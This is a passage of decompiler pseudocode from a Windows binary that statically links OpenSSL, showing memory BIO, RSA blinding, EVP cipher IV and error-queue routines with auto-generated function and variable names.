      if ( sub_4199A0(*v3, v5 + Size) )
      {
        memcpy((void *)(v5 + *(_DWORD *)(*v3 + 4)), Src, Size);
        v6 = (_DWORD *)*v3;
        v7 = (_DWORD *)v3[1];
        *v7 = *(_DWORD *)*v3;
        v7[1] = v6[1];
        v7[2] = v6[2];
        v7[3] = v6[3];
        return Size;
      }
      else
      {
        return -1;
      }
    }
  }
  else
  {
    sub_408310(32, 117, 115, (int)"crypto\\bio\\bss_mem.c", 207);
    return -1;
  }
}

//----- (00406B70) --------------------------------------------------------
int __cdecl sub_406B70(_DWORD *a1, int a2, int a3, int *a4)
{
  int **v4; // edi
  int v5; // ebp
  int *v6; // ebx
  void *v7; // eax
  int *v8; // eax
  int v9; // ecx
  int *v10; // edi
  int result; // eax
  int *v12; // edi
  int *v13; // ecx

  v4 = (int **)a1[8];
  v5 = 1;
  switch ( a2 )
  {
    case 1:
      v6 = *v4;
      v7 = (void *)(*v4)[1];
      if ( !v7 )
        goto LABEL_18;
      if ( (a1[5] & 0x600) != 0 )
      {
        *v6 = v6[2];
      }
      else
      {
        memset(v7, 0, v6[2]);
        *v6 = 0;
      }
      v8 = *v4;
      v9 = **v4;
      v10 = v4[1];
      *v10 = v9;
      v10[1] = v8[1];
      v10[2] = v8[2];
      v10[3] = v8[3];
      return 1;
    case 2:
      return *v4[1] == 0;
    case 3:
      v12 = v4[1];
      v5 = *v12;
      if ( !a4 )
        goto LABEL_18;
      *a4 = v12[1];
      return v5;
    case 8:
      return a1[4];
    case 9:
      a1[4] = a3;
      return 1;
    case 10:
      return *v4[1];
    case 11:
    case 12:
      goto LABEL_18;
    case 114:
      sub_406960(a1, 0);
      a1[4] = a3;
      v13 = v4[1];
      *v4 = a4;
      *v13 = *a4;
      v13[1] = a4[1];
      v13[2] = a4[2];
      v13[3] = a4[3];
      a1[8] = v4;
      return 1;
    case 115:
      if ( !a4 )
        goto LABEL_18;
      sub_4069E0((int)a1);
      result = 1;
      *a4 = (int)v4[1];
      break;
    case 130:
      a1[7] = a3;
      return 1;
    default:
      v5 = 0;
LABEL_18:
      result = v5;
      break;
  }
  return result;
}

//----- (00406D70) --------------------------------------------------------
int __cdecl sub_406D70(int a1, _BYTE *a2, int a3)
{
  int *v3; // esi
  int v4; // ecx
  int result; // eax
  int v6; // esi

  v3 = *(int **)(*(_DWORD *)(a1 + 32) + 4);
  sub_405010(a1, 15);
  v4 = *v3;
  if ( a3 - 1 < *v3 )
    v4 = a3 - 1;
  result = 0;
  if ( v4 > 0 )
  {
    v6 = v3[1];
    while ( *(_BYTE *)(result + v6) != 10 )
    {
      if ( ++result >= v4 )
        goto LABEL_10;
    }
    ++result;
LABEL_10:
    result = sub_406A30(a1, a2, result);
    if ( result > 0 )
      a2[result] = 0;
  }
  else
  {
    *a2 = 0;
  }
  return result;
}

//----- (00406DE0) --------------------------------------------------------
size_t __cdecl sub_406DE0(int a1, void *Src)
{
  return sub_406AA0(a1, Src, strlen((const char *)Src));
}

//----- (00406E10) --------------------------------------------------------
int __cdecl sub_406E10(_DWORD *a1)
{
  void **v2; // esi
  _DWORD *v3; // eax

  if ( !a1 )
    return 0;
  if ( a1[4] )
  {
    if ( a1[3] )
    {
      v2 = (void **)a1[8];
      if ( v2 )
      {
        v3 = *v2;
        if ( (a1[5] & 0x200) != 0 )
          v3[1] = 0;
        sub_419810(v3);
        sub_413490(v2[1]);
        sub_413490(v2);
        a1[8] = 0;
      }
    }
  }
  return 1;
}

//----- (00406E80) --------------------------------------------------------
int __cdecl sub_406E80(int a1)
{
  sub_4162A0((volatile LONG *)dword_5373C4);
  dword_5373C4 = 0;
  dword_5373C8 = a1;
  return 1;
}
// 5373C4: using guessed type int dword_5373C4;
// 5373C8: using guessed type int dword_5373C8;

//----- (00406EB0) --------------------------------------------------------
int sub_406EB0()
{
  void **v0; // eax
  volatile LONG *v1; // eax
  volatile LONG *v2; // esi
  void (*v3)(void); // eax
  int result; // eax

  v0 = (void **)dword_5373C8;
  if ( !dword_5373C8 )
  {
    v1 = sub_41A740();
    v2 = v1;
    if ( v1 )
    {
      v0 = (void **)sub_435DD0((int)v1);
      dword_5373C8 = (int)v0;
      if ( v0 )
      {
        dword_5373C4 = (int)v2;
LABEL_6:
        if ( !v0 )
          goto LABEL_9;
        goto LABEL_7;
      }
      sub_4162A0(v2);
    }
    v0 = sub_419B40();
    dword_5373C8 = (int)v0;
    goto LABEL_6;
  }
LABEL_7:
  v3 = (void (*)(void))v0[2];
  if ( v3 )
    v3();
LABEL_9:
  result = sub_4162A0((volatile LONG *)dword_5373C4);
  dword_5373C4 = 0;
  dword_5373C8 = 0;
  return result;
}
// 5373C4: using guessed type int dword_5373C4;
// 5373C8: using guessed type int dword_5373C8;

//----- (00406F30) --------------------------------------------------------
void **sub_406F30()
{
  void **result; // eax
  volatile LONG *v1; // eax
  volatile LONG *v2; // esi

  result = (void **)dword_5373C8;
  if ( !dword_5373C8 )
  {
    v1 = sub_41A740();
    v2 = v1;
    if ( v1 )
    {
      result = (void **)sub_435DD0((int)v1);
      dword_5373C8 = (int)result;
      if ( result )
      {
        dword_5373C4 = (int)v2;
LABEL_6:
        if ( !result )
          return result;
        goto LABEL_7;
      }
      sub_4162A0(v2);
    }
    result = sub_419B40();
    dword_5373C8 = (int)result;
    goto LABEL_6;
  }
LABEL_7:
  result = (void **)*result;
  if ( result )
    return (void **)((int (*)(void))result)();
  return result;
}
// 5373C4: using guessed type int dword_5373C4;
// 5373C8: using guessed type int dword_5373C8;

//----- (00406F80) --------------------------------------------------------
void **__cdecl sub_406F80(int a1, int a2, double a3)
{
  void **result; // eax
  volatile LONG *v4; // eax
  volatile LONG *v5; // esi
  int (__cdecl *v6)(_DWORD, _DWORD, _DWORD, _DWORD); // ecx
  void *v7; // esp

  result = (void **)dword_5373C8;
  if ( !dword_5373C8 )
  {
    v4 = sub_41A740();
    v5 = v4;
    if ( v4 )
    {
      result = (void **)sub_435DD0((int)v4);
      dword_5373C8 = (int)result;
      if ( result )
      {
        dword_5373C4 = (int)v5;
LABEL_6:
        if ( !result )
          return result;
        goto LABEL_7;
      }
      sub_4162A0(v5);
    }
    result = sub_419B40();
    dword_5373C8 = (int)result;
    goto LABEL_6;
  }
LABEL_7:
  v6 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD))result[3];
  if ( v6 )
  {
    v7 = alloca(8);
    return (void **)v6(a1, a2, LODWORD(a3), HIDWORD(a3));
  }
  return result;
}
// 5373C4: using guessed type int dword_5373C4;
// 5373C8: using guessed type int dword_5373C8;

//----- (00406FF0) --------------------------------------------------------
int sub_406FF0()
{
  void **v0; // eax
  volatile LONG *v1; // eax
  volatile LONG *v2; // esi
  int (*v3)(void); // eax

  v0 = (void **)dword_5373C8;
  if ( !dword_5373C8 )
  {
    v1 = sub_41A740();
    v2 = v1;
    if ( v1 )
    {
      v0 = (void **)sub_435DD0((int)v1);
      dword_5373C8 = (int)v0;
      if ( v0 )
      {
        dword_5373C4 = (int)v2;
LABEL_6:
        if ( !v0 )
          return -1;
        goto LABEL_7;
      }
      sub_4162A0(v2);
    }
    v0 = sub_419B40();
    dword_5373C8 = (int)v0;
    goto LABEL_6;
  }
LABEL_7:
  v3 = (int (*)(void))v0[1];
  if ( v3 )
    return v3();
  return -1;
}
// 5373C4: using guessed type int dword_5373C4;
// 5373C8: using guessed type int dword_5373C8;

//----- (00407050) --------------------------------------------------------
int sub_407050()
{
  void **v0; // eax
  volatile LONG *v1; // eax
  volatile LONG *v2; // esi
  int (*v3)(void); // eax

  v0 = (void **)dword_5373C8;
  if ( !dword_5373C8 )
  {
    v1 = sub_41A740();
    v2 = v1;
    if ( v1 )
    {
      v0 = (void **)sub_435DD0((int)v1);
      dword_5373C8 = (int)v0;
      if ( v0 )
      {
        dword_5373C4 = (int)v2;
LABEL_6:
        if ( !v0 )
          return 0;
        goto LABEL_7;
      }
      sub_4162A0(v2);
    }
    v0 = sub_419B40();
    dword_5373C8 = (int)v0;
    goto LABEL_6;
  }
LABEL_7:
  v3 = (int (*)(void))v0[5];
  if ( v3 )
    return v3();
  return 0;
}
// 5373C4: using guessed type int dword_5373C4;
// 5373C8: using guessed type int dword_5373C8;

//----- (004070B0) --------------------------------------------------------
int __cdecl sub_4070B0(_DWORD *a1, int a2, int a3, void *a4)
{
  return sub_41A750((int (__cdecl *)(int, void **, int))sub_41D370, "RSA PUBLIC KEY", a1, a2, a3, a4);
}

//----- (004070E0) --------------------------------------------------------
int __cdecl sub_4070E0(int a1)
{
  return (sub_416F90(*(_DWORD **)(a1 + 16)) + 7) / 8;
}

//----- (00407100) --------------------------------------------------------
int __cdecl sub_407100(int a1, int a2, int a3, int a4)
{
  return (*(int (**)(void))(*(_DWORD *)(a4 + 8) + 4))();
}

//----- (00407110) --------------------------------------------------------
int __cdecl sub_407110(int a1, int a2, int a3, int a4)
{
  return (*(int (**)(void))(*(_DWORD *)(a4 + 8) + 12))();
}

//----- (00407120) --------------------------------------------------------
int __cdecl sub_407120(int a1, int a2, int a3, int a4)
{
  return (*(int (**)(void))(*(_DWORD *)(a4 + 8) + 16))();
}

//----- (00407130) --------------------------------------------------------
int __cdecl sub_407130(int a1, int a2, int a3, int a4)
{
  return (*(int (**)(void))(*(_DWORD *)(a4 + 8) + 8))();
}

//----- (00407140) --------------------------------------------------------
void **__usercall sub_407140@<eax>(int *a1@<esi>, _DWORD *a2, int a3, int a4)
{
  int *v4; // ebx
  unsigned int **v5; // ebp
  unsigned int **v6; // edi
  void **v7; // eax
  void **v8; // eax
  void **v9; // edi

  if ( !a2 || !a3 || !a4 )
    return 0;
  sub_420700(a1);
  v4 = sub_420790(a1);
  v5 = (unsigned int **)sub_420790(a1);
  v6 = (unsigned int **)sub_420790(a1);
  if ( v6
    && (v7 = sub_416820(), sub_422020(v5, a3, (int)v7))
    && (v8 = sub_416820(), sub_422020(v6, a4, (int)v8))
    && sub_421C20((unsigned int **)v4, v5, v6, a1) )
  {
    v9 = sub_4211F0(0, a2, v4, a1);
    sub_420750(a1);
    return v9;
  }
  else
  {
    sub_420750(a1);
    return 0;
  }
}

//----- (00407220) --------------------------------------------------------
int *__usercall sub_407220@<eax>(__m64 a1@<mm0>, int a2, int *Block)
{
  int *v3; // esi
  int *result; // eax
  void **v5; // ebp
  void *v6; // esp
  int v7; // eax
  void **v8; // eax
  void **v9; // ebx
  int v10; // [esp-4h] [ebp-1Ch]
  _DWORD *v11; // [esp+14h] [ebp-4h]

  v3 = Block;
  v11 = 0;
  if ( Block || (result = sub_420670(), (v3 = result) != 0) )
  {
    sub_420700(v3);
    v5 = (void **)sub_420790(v3);
    if ( v5 )
    {
      v5 = *(void ***)(a2 + 20);
      if ( v5 || (v5 = sub_407140(v3, *(_DWORD **)(a2 + 24), *(_DWORD *)(a2 + 28), *(_DWORD *)(a2 + 32))) != 0 )
      {
        if ( !sub_407050() && *(_DWORD *)(a2 + 24) && sub_435D30(*(_DWORD *)(a2 + 24)) )
        {
          v6 = alloca(8);
          v10 = 4 * sub_432B60(*(_DWORD *)(a2 + 24));
          v7 = sub_435D30(*(_DWORD *)(a2 + 24));
          sub_406F80(v7, v10, 0.0);
        }
        v8 = (void **)sub_4168C0();
        v9 = v8;
        if ( v8 )
        {
          sub_416E80(v8, *(_DWORD **)(a2 + 16), 4);
          v11 = sub_416560(a1, 0, (int)v5, (int)v9, v3, *(_DWORD *)(*(_DWORD *)(a2 + 8) + 24), *(_DWORD *)(a2 + 60));
          sub_417060(v9);
          if ( v11 )
            sub_416440((int)v11);
          else
            sub_408310(4, 136, 3, (int)"crypto\\rsa\\rsa_crpt.c", 164);
        }
        else
        {
          sub_408310(4, 136, 65, (int)"crypto\\rsa\\rsa_crpt.c", 153);
        }
      }
      else
      {
        sub_408310(4, 136, 140, (int)"crypto\\rsa\\rsa_crpt.c", 133);
      }
    }
    else
    {
      sub_408310(4, 136, 65, (int)"crypto\\rsa\\rsa_crpt.c", 126);
    }
    sub_420750(v3);
    if ( v3 != Block )
      sub_4206C0((void **)v3);
    if ( v5 != *(void ***)(a2 + 20) )
      sub_417060(v5);
    return v11;
  }
  return result;
}

//----- (004073D0) --------------------------------------------------------
int __cdecl sub_4073D0(int a1)
{
  return *(_DWORD *)(*(_DWORD *)a1 + 4);
}

//----- (004073E0) --------------------------------------------------------
int __cdecl sub_4073E0(int a1)
{
  return (*(int (**)(void))(*(_DWORD *)a1 + 24))();
}

//----- (004073F0) --------------------------------------------------------
int __cdecl sub_4073F0(int a1)
{
  return *(_DWORD *)(a1 + 96);
}

//----- (00407400) --------------------------------------------------------
int __cdecl sub_407400(int a1)
{
  return *(_DWORD *)(a1 + 12);
}

//----- (00407410) --------------------------------------------------------
int __cdecl sub_407410(int a1)
{
  return *(_DWORD *)(*(_DWORD *)a1 + 12);
}

//----- (00407420) --------------------------------------------------------
int __cdecl sub_407420(int a1)
{
  return a1 + 16;
}

//----- (00407440) --------------------------------------------------------
int __cdecl sub_407440(int a1)
{
  return a1 + 48;
}

//----- (00407450) --------------------------------------------------------
int __cdecl sub_407450(int a1)
{
  return *(_DWORD *)(a1 + 80);
}

//----- (00407460) --------------------------------------------------------
int __cdecl sub_407460(int a1, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)(a1 + 80) = a2;
  return result;
}

//----- (00407470) --------------------------------------------------------
int __cdecl sub_407470(int a1)
{
  return *(_DWORD *)(a1 + 88);
}

//----- (00407480) --------------------------------------------------------
int __cdecl sub_407480(int a1)
{
  if ( a1 )
    return *(_DWORD *)(a1 + 8);
  sub_408310(6, 162, 159, (int)"crypto\\evp\\evp_lib.c", 304);
  return -1;
}

//----- (004074B0) --------------------------------------------------------
_DWORD *__cdecl sub_4074B0(int a1, int a2)
{
  _DWORD *result; // eax

  result = sub_413430(0x30u);
  if ( result )
  {
    *result = a1;
    result[1] = a2;
  }
  return result;
}

//----- (004074E0) --------------------------------------------------------
void __cdecl sub_4074E0(void *Block)
{
  sub_413490(Block);
}

//----- (00407500) --------------------------------------------------------
int __cdecl sub_407500(int a1, int a2)
{
  *(_DWORD *)(a1 + 40) = a2;
  return 1;
}

//----- (00407520) --------------------------------------------------------
int __cdecl sub_407520(int a1, int a2)
{
  *(_DWORD *)(a1 + 16) = a2;
  return 1;
}

//----- (00407540) --------------------------------------------------------
int __cdecl sub_407540(int a1, int a2)
{
  *(_DWORD *)(a1 + 20) = a2;
  return 1;
}

//----- (00407560) --------------------------------------------------------
int __cdecl sub_407560(int a1, int a2)
{
  *(_DWORD *)(a1 + 24) = a2;
  return 1;
}

//----- (00407590) --------------------------------------------------------
int __cdecl sub_407590(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 8) |= a2;
  return result;
}

//----- (004075A0) --------------------------------------------------------
int __cdecl sub_4075A0(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 8) &= ~a2;
  return result;
}

//----- (004075B0) --------------------------------------------------------
int __cdecl sub_4075B0(int a1, int a2)
{
  return a2 & *(_DWORD *)(a1 + 8);
}

//----- (004075C0) --------------------------------------------------------
int __cdecl sub_4075C0(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 92) |= a2;
  return result;
}

//----- (004075D0) --------------------------------------------------------
int __cdecl sub_4075D0(int a1, int a2)
{
  return a2 & *(_DWORD *)(a1 + 92);
}

//----- (004075E0) --------------------------------------------------------
int __cdecl sub_4075E0(int a1, _DWORD *a2)
{
  int v2; // edi
  size_t v3; // esi
  int v4; // eax

  v2 = 0;
  if ( a2 )
  {
    v3 = *(_DWORD *)(*(_DWORD *)a1 + 12);
    if ( v3 > 0x10 )
      sub_417C70("assertion failed: l <= sizeof(c->iv)", "crypto\\evp\\evp_lib.c", 82);
    v4 = sub_4224B0(a2, (void *)(a1 + 16), *(_DWORD *)(*(_DWORD *)a1 + 12));
    v2 = v4;
    if ( v4 != v3 )
      return -1;
    if ( v4 > 0 )
      memcpy((void *)(a1 + 32), (const void *)(a1 + 16), v3);
  }
  return v2;
}

//----- (00407650) --------------------------------------------------------
int __cdecl sub_407650(int a1, _DWORD *a2)
{
  int result; // eax

  result = 0;
  if ( a2 )
  {
    if ( *(_DWORD *)(*(_DWORD *)a1 + 12) > 0x10u )
      sub_417C70("assertion failed: j <= sizeof(c->iv)", "crypto\\evp\\evp_lib.c", 99);
    return sub_422460(a2, (void *)(a1 + 16), *(_DWORD *)(*(_DWORD *)a1 + 12));
  }
  return result;
}

//----- (004076A0) --------------------------------------------------------
int __cdecl sub_4076A0(unsigned int *a1)
{
  unsigned int v1; // esi
  int result; // eax
  void **v3; // edi

  v1 = *a1;
  if ( (int)*a1 > 421 )
  {
    switch ( v1 )
    {
      case 0x1A9u:
      case 0x28Bu:
      case 0x28Eu:
        result = 425;
        break;
      case 0x1ADu:
      case 0x28Cu:
      case 0x28Fu:
        result = 429;
        break;
      case 0x28Au:
      case 0x28Du:
        return 421;
      case 0x290u:
      case 0x291u:
      case 0x292u:
      case 0x293u:
LABEL_10:
        result = 30;
        break;
      default:
LABEL_11:
        v3 = (void **)sub_423310(v1);
        if ( !sub_423640((int)v3) )
          v1 = 0;
        sub_422B70(v3);
        result = v1;
        break;
    }
  }
  else if ( *a1 == 421 )
  {
    return 421;
  }
  else
  {
    switch ( v1 )
    {
      case 5u:
      case 0x61u:
        result = 5;
        break;
      case 0x1Eu:
      case 0x3Du:
        goto LABEL_10;
      case 0x25u:
      case 0x62u:
      case 0xA6u:
        result = 37;
        break;
      default:
        goto LABEL_11;
    }
  }
  return result;
}

//----- (004078F0) --------------------------------------------------------
int __cdecl sub_4078F0(int a1, _DWORD *a2)
{
  _DWORD *v2; // ecx
  int (*v3)(void); // eax
  int v5; // eax
  unsigned int v6; // eax
  bool v7; // zf

  v2 = *(_DWORD **)a1;
  v3 = *(int (**)(void))(*(_DWORD *)a1 + 36);
  if ( v3 )
    return v3();
  v5 = v2[4];
  if ( (v5 & 0x1000) == 0 )
    return -1;
  v6 = v5 & 0xF0007;
  if ( v6 > 0x10002 )
  {
    v7 = v6 == 65539;
LABEL_13:
    if ( !v7 )
      return sub_407650(a1, a2);
    return -1;
  }
  if ( v6 != 65538 )
  {
    if ( v6 < 6 )
      return sub_407650(a1, a2);
    if ( v6 <= 7 )
      return -1;
    v7 = v6 == 65537;
    goto LABEL_13;
  }
  if ( *v2 == 246 )
    sub_423E40(a2, 5, 0);
  return 1;
}

//----- (00407960) --------------------------------------------------------
int __cdecl sub_407960(int a1, _DWORD *a2)
{
  int (*v2)(void); // eax
  int v4; // eax
  unsigned int v5; // eax
  bool v6; // zf

  v2 = *(int (**)(void))(*(_DWORD *)a1 + 40);
  if ( v2 )
    return v2();
  v4 = *(_DWORD *)(*(_DWORD *)a1 + 16);
  if ( (v4 & 0x1000) == 0 )
    return -1;
  v5 = v4 & 0xF0007;
  if ( v5 > 0x10002 )
  {
    v6 = v5 == 65539;
LABEL_11:
    if ( !v6 )
      return sub_4075E0(a1, a2);
    return -1;
  }
  if ( v5 == 65538 )
    return 1;
  if ( v5 < 6 )
    return sub_4075E0(a1, a2);
  if ( v5 > 7 )
  {
    v6 = v5 == 65537;
    goto LABEL_11;
  }
  return -1;
}

//----- (004079C0) --------------------------------------------------------
void *__cdecl sub_4079C0(char *Src, size_t Size, void *a3)
{
  void *v3; // esi
  void *result; // eax
  int v5[23]; // [esp+4h] [ebp-5Ch] BYREF

  v3 = a3;
  if ( !a3 )
    v3 = &unk_5373CC;
  result = (void *)sub_424220(v5);
  if ( result )
  {
    sub_424010(v5, Src, Size);
    sub_4240F0((int)v3, (int)v5);
    sub_4139E0(v5, 0x5Cu);
    return v3;
  }
  return result;
}

//----- (00407A30) --------------------------------------------------------
unsigned int __cdecl sub_407A30(_DWORD *a1)
{
  unsigned int v1; // ecx

  v1 = *a1 ^ ((unsigned int)(*a1 ^ (*a1 >> 12)) >> 12) & 0xFFF;
  return v1 ^ (13 * (v1 % 0x13));
}

//----- (00407A70) --------------------------------------------------------
_DWORD *__cdecl sub_407A70(int a1)
{
  _DWORD *v1; // esi

  v1 = 0;
  sub_414690(dword_5388C0);
  if ( dword_5388D0 )
    v1 = sub_424780((int)dword_5388D0, a1);
  sub_4146B0(dword_5388C0);
  return v1;
}

//----- (00407AB0) --------------------------------------------------------
int sub_407AB0()
{
  int v1; // edi
  char *v2; // ebx
  char **v3; // esi
  bool v4; // zf

  sub_414690(dword_5388C0);
  if ( !dword_53127C )
    return sub_4146B0(dword_5388C0);
  v1 = 1;
  v2 = byte_5373E0;
  v3 = (char **)&unk_5383C4;
  do
  {
    v4 = *v3 == 0;
    *(v3 - 1) = (char *)v1;
    if ( v4 )
    {
      if ( sub_424BE0(v1, v2, 0x20u) )
        *v3 = v2;
      if ( !*v3 )
        *v3 = "unknown";
    }
    v3 += 2;
    ++v1;
    v2 += 32;
  }
  while ( (int)v3 <= (int)&unk_5387B4 );
  dword_53127C = 0;
  return sub_4146B0(dword_5388C0);
}
// 53127C: using guessed type int dword_53127C;

//----- (00407B50) --------------------------------------------------------
void __cdecl sub_407B50(char *Block)
{
  _BYTE *v1; // esi
  int v2; // edi

  if ( Block )
  {
    v1 = Block + 192;
    v2 = 16;
    do
    {
      if ( (*v1 & 1) != 0 )
      {
        sub_413490(*((void **)v1 - 16));
        *((_DWORD *)v1 - 16) = 0;
      }
      *(_DWORD *)v1 = 0;
      v1 += 4;
      --v2;
    }
    while ( v2 );
    sub_413490(Block);
  }
}

//----- (00407BB0) --------------------------------------------------------
void sub_407BB0()
{
  sub_4146D0(dword_5388C0);
  dword_5388C0 = 0;
}

//----- (00407BD0) --------------------------------------------------------
int __usercall sub_407BD0@<eax>(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  sub_414690(dword_5388C0);
  v3 = dword_5388D0;
  if ( dword_5388D0
    || (v3 = sub_4245F0((int (__cdecl *)(_BYTE *))sub_407A30, (int (__cdecl *)(const char *, const char *))sub_42AC20),
        (dword_5388D0 = v3) != 0) )
  {
    if ( *a1 )
    {
      while ( 1 )
      {
        if ( a2 )
          *a1 |= a2 << 24;
        sub_424680(v3, (int)a1);
        a1 += 2;
        if ( !*a1 )
          break;
        v3 = dword_5388D0;
      }
    }
  }
  return sub_4146B0(dword_5388C0);
}

//----- (00407C50) --------------------------------------------------------
struct _RTL_CRITICAL_SECTION *sub_407C50()
{
  struct _RTL_CRITICAL_SECTION *result; // eax

  result = sub_414650();
  dword_5388C0 = result;
  dword_5388D4 = result != 0;
  return result;
}
// 5388D4: using guessed type int dword_5388D4;

//----- (00407C70) --------------------------------------------------------
int sub_407C70()
{
  if ( (sub_414700(&dword_5388CC, (void (*)(void))sub_407C50) ? dword_5388D4 : 0) == 0 )
    return 0;
  sub_407BD0(&dword_531000, 0);
  sub_407BD0(&dword_5311A0, 0);
  sub_407BD0(&dword_531110, 2);
  sub_407AB0();
  sub_407BD0(&dword_5383C0, 2);
  return 1;
}
// 531000: using guessed type _DWORD dword_531000;
// 531110: using guessed type _DWORD dword_531110;
// 5311A0: using guessed type _DWORD dword_5311A0;
// 5383C0: using guessed type _DWORD dword_5383C0;
// 5388D4: using guessed type int dword_5388D4;

//----- (00407CD0) --------------------------------------------------------
int __cdecl sub_407CD0(int a1, _DWORD *a2)
{
  int result; // eax

  result = sub_407C70();
  if ( result )
  {
    sub_407BD0(a2, a1);
    return 1;
  }
  return result;
}

//----- (00407CF0) --------------------------------------------------------
int __cdecl sub_407CF0(int a1, _DWORD *a2)
{
  _DWORD *i; // esi

  if ( (sub_414700(&dword_5388CC, (void (*)(void))sub_407C50) ? dword_5388D4 : 0) == 0 )
    return 0;
  sub_414690(dword_5388C0);
  if ( dword_5388D0 )
  {
    for ( i = a2; *i; i += 2 )
    {
      if ( a1 )
        *i |= a1 << 24;
      sub_424710(dword_5388D0, (int)i);
    }
  }
  sub_4146B0(dword_5388C0);
  return 1;
}
// 5388D4: using guessed type int dword_5388D4;

//----- (00407D70) --------------------------------------------------------
int sub_407D70()
{
  int result; // eax

  result = -sub_414700(&dword_5388CC, (void (*)(void))sub_407C50);
  if ( (result & dword_5388D4) != 0 )
  {
    sub_414690(dword_5388C0);
    sub_424260((void **)dword_5388D0);
    dword_5388D0 = 0;
    return sub_4146B0(dword_5388C0);
  }
  return result;
}
// 5388D4: using guessed type int dword_5388D4;

//----- (00407DC0) --------------------------------------------------------
int __cdecl sub_407DC0(int a1)
{
  _DWORD *v2; // esi
  unsigned int v3; // [esp+0h] [ebp-8h] BYREF

  if ( (sub_414700(&dword_5388CC, (void (*)(void))sub_407C50) ? dword_5388D4 : 0) == 0 )
    return 0;
  v3 = a1 & 0xFF000000;
  v2 = 0;
  sub_414690(dword_5388C0);
  if ( dword_5388D0 )
    v2 = sub_424780((int)dword_5388D0, (int)&v3);
  sub_4146B0(dword_5388C0);
  if ( v2 )
    return v2[1];
  else
    return 0;
}
// 5388D4: using guessed type int dword_5388D4;

//----- (00407E50) --------------------------------------------------------
int __cdecl sub_407E50(int a1)
{
  _DWORD *v2; // esi
  unsigned int v3; // [esp+0h] [ebp-8h] BYREF

  if ( (sub_414700(&dword_5388CC, (void (*)(void))sub_407C50) ? dword_5388D4 : 0) == 0 )
    return 0;
  v3 = a1 & 0xFFFFF000;
  v2 = 0;
  sub_414690(dword_5388C0);
  if ( dword_5388D0 )
    v2 = sub_424780((int)dword_5388D0, (int)&v3);
  sub_4146B0(dword_5388C0);
  if ( v2 )
    return v2[1];
  else
    return 0;
}
// 5388D4: using guessed type int dword_5388D4;

//----- (00407EE0) --------------------------------------------------------
_DWORD *__cdecl sub_407EE0(int a1)
{
  _DWORD *result; // eax
  _DWORD *v2; // edi
  int v3[2]; // [esp+0h] [ebp-8h] BYREF

  if ( (sub_414700(&dword_5388CC, (void (*)(void))sub_407C50) ? dword_5388D4 : 0) == 0 )
    return 0;
  v3[0] = a1 & 0xFF000FFF;
  v2 = 0;
  sub_414690(dword_5388C0);
  if ( dword_5388D0 )
    v2 = sub_424780((int)dword_5388D0, (int)v3);
  sub_4146B0(dword_5388C0);
  result = v2;
  if ( v2 )
    return (_DWORD *)result[1];
  v3[0] = a1 & 0xFFF;
  result = sub_407A70((int)v3);
  if ( result )
    return (_DWORD *)result[1];
  return result;
}
// 5388D4: using guessed type int dword_5388D4;

//----- (00407F90) --------------------------------------------------------
BOOL sub_407F90()
{
  BOOL result; // eax

  result = sub_414750(&dword_5388C4);
  dword_5388D8 = result;
  return result;
}
// 5388C4: using guessed type DWORD dword_5388C4;
// 5388D8: using guessed type int dword_5388D8;

//----- (00407FB0) --------------------------------------------------------
char *sub_407FB0()
{
  char *v1; // esi
  char *v2; // eax

  if ( (sub_414700(&dword_5388C8, (void (*)(void))sub_407F90) ? dword_5388D8 : 0) == 0 )
    return 0;
  v1 = (char *)sub_414770(&dword_5388C4);
  if ( !v1 )
  {
    v2 = (char *)sub_413430(0x188u);
    v1 = v2;
    if ( !v2 )
      return 0;
    if ( !sub_414780(&dword_5388C4, v2) )
    {
      sub_407B50(v1);
      return 0;
    }
    sub_424FA0(2, 0, 0);
    sub_424C60(2);
  }
  return v1;
}
// 5388C4: using guessed type DWORD dword_5388C4;
// 5388D8: using guessed type int dword_5388D8;

//----- (00408040) --------------------------------------------------------
int sub_408040()
{
  int v1; // esi

  if ( (sub_414700(&dword_5388CC, (void (*)(void))sub_407C50) ? dword_5388D4 : 0) == 0 )
    return 0;
  sub_414690(dword_5388C0);
  v1 = dword_531278++;
  sub_4146B0(dword_5388C0);
  return v1;
}
// 531278: using guessed type int dword_531278;
// 5388D4: using guessed type int dword_5388D4;

//----- (00408090) --------------------------------------------------------
void __cdecl sub_408090(int a1, int a2)
{
  int v2; // eax
  int v3; // edi
  int v4; // esi

  v2 = sub_407FB0();
  v3 = v2;
  v4 = *(_DWORD *)(v2 + 384);
  if ( !v4 )
    v4 = 15;
  if ( (*(_BYTE *)(v2 + 4 * v4 + 192) & 1) != 0 )
  {
    sub_413490(*(void **)(v2 + 4 * v4 + 128));
    *(_DWORD *)(v3 + 4 * v4 + 128) = 0;
  }
  *(_DWORD *)(v3 + 4 * v4 + 128) = a1;
  *(_DWORD *)(v3 + 4 * v4 + 192) = a2;
}
// 407FB0: using guessed type int sub_407FB0(void);

//----- (00408110) --------------------------------------------------------
void __cdecl sub_408110(int a1, int a2)
{
  int v2; // esi
  _BYTE *v3; // eax
  void *v4; // edi
  int v5; // ebx
  int v6; // eax
  const char *v7; // ebp
  void *v8; // eax
  int v9; // [esp+Ch] [ebp-8h]
  int v10; // [esp+10h] [ebp-4h]

  v2 = 80;
  v3 = sub_4133F0(0x51u);
  v4 = v3;
  v5 = 0;
  if ( v3 )
  {
    *v3 = 0;
    v9 = 0;
    if ( a1 > 0 )
    {
      v6 = a2 - 4;
      do
      {
        v7 = *(const char **)(v6 + 4);
        v6 += 4;
        v10 = v6;
        if ( v7 )
        {
          v5 += strlen(v7);
          if ( v5 > v2 )
          {
            v2 = v5 + 20;
            v8 = sub_413500(v4, v5 + 21, (int)"crypto\\err\\err.c", 722);
            if ( !v8 )
            {
              sub_413490(v4);
              return;
            }
            v4 = v8;
          }
          sub_4248C0((char *)v4, v7, v2 + 1);
          v6 = v10;
        }
        ++v9;
      }
      while ( v9 < a1 );
    }
    sub_408090((int)v4, 3);
  }
}

//----- (004081F0) --------------------------------------------------------
int sub_4081F0()
{
  char *v0; // eax

  v0 = sub_407FB0();
  if ( *((_DWORD *)v0 + 97) == *((_DWORD *)v0 + 96) )
    return 0;
  *(_DWORD *)&v0[4 * *((_DWORD *)v0 + 96)] |= 1u;
  return 1;
}

//----- (00408220) --------------------------------------------------------
int sub_408220()
